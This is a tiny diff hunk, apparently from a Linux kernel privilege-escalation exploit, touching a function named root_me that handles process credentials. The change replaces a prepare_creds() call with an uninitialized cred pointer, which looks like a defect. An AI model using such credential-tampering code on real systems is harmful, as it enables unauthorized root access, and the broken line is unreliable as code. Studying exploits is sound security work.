@@ -180,7 +180,7 @@ void *memmem ( const void *haystack, size_t haystack_size, const void *needle, s
 
 void root_me(void)
 {
-    struct cred * new_cred = prepare_creds();
+    struct cred * new_cred;
 
     if(current->cred->uid==0)
     {
